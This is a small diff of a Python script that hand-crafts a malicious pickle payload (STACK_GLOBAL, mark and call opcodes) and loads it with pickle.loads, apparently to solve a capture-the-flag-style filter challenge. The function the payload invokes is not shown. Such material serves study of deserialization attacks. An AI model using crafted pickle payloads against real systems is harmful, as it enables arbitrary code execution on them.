@@ -18,11 +18,9 @@ crafter.add_payload(pickle.STACK_GLOBAL)
 
 crafter.mark()
 crafter.push_str(s3)
-crafter.to_tuple(use_mark=True)
-crafter.reduce()
-crafter.stop()
+crafter.call_f(1, use_mark=True)
 
-payload = crafter.get_payload()
+payload = crafter.get_payload(check_stop=True)
 
 try:
     # check: unicode-safe
@@ -33,4 +31,3 @@ try:
     pickle.loads(payload)
 except:
     print("????")
-
